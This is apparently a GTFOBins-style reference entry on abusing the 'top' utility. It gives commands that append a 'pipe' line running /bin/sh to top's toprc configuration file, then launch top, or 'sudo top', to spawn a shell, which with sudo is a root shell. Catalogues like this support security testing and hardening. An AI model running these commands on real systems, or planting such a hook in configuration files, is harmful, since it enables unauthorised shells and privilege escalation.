---
description: This requires that an existing configuration file is present, to create one run `top` then type `Wq`. Note down the actual configuration file path and use it in the below examples.
functions:
  shell:
    - code: |
        echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
        top
        # press return twice
        reset
  sudo:
    - code: |
        echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
        sudo top
        # press return twice
        reset
---
